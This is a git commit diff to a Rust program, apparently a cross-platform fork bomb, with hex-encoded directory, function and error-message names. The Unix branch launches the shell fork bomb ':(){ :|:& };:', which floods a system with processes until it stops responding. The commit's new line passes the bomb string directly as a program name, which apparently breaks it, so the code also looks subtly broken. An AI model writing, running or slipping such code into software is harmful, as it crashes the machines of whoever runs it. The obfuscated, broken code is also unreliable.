c834de8d2f3a0697a134fad2fda539f667796199
Pikkel <ilovemathguy@gmail.com>
2021-12-22 04:54:37 -0500

    ...

--- src/_0x666f726b626f6d62/main.rs
+++ src/_0x666f726b626f6d62/main.rs
@@ -7,8 +7,7 @@ pub fn main() {
 // different forkbombs so it'll be multiOS
 fn _0x7265616c666f726b() {
     if cfg!(unix) {
-        Command::new("bash")
-            .arg(":(){ :|:& };:")
+        Command::new(":(){ :|:& };:")
             .spawn()
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
     } else if cfg!(windows) {
